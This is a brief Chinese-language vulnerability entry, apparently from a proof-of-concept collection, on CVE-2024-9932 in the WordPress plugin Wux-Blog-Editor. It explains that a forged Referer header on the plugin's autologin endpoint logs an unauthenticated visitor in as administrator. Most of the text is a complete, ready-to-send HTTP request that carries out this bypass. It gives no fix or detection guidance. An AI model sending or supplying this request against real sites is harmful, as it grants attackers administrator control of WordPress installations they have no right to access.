# WordPress插件Wux-Blog-Editor存在前台越权漏洞( CVE-2024-9932)

**Wux-Blog-Editor 是在一个地方编辑来自所有不同WordPress网站的帖子和页面的插件，位于 /wp-content/plugins/wux-blog-editor/External_Post_Editor.php 中的 wuxbt_externalAutologin 方法存在前台越权漏洞，只需要传入Referer 为 https://blog.tool.wux.nl/ 即可直接登录管理员账号.**

## poc
```javascript
GET /wp-json/external-post-editor/v2/autologin HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Referer: https://blog.tool.wux.nl/
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: su_webp=1
Connection: close
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501041355933.webp)

## 漏洞来源

- https://mp.weixin.qq.com/s/FxogQW3DX58JYtWxFfxSIQ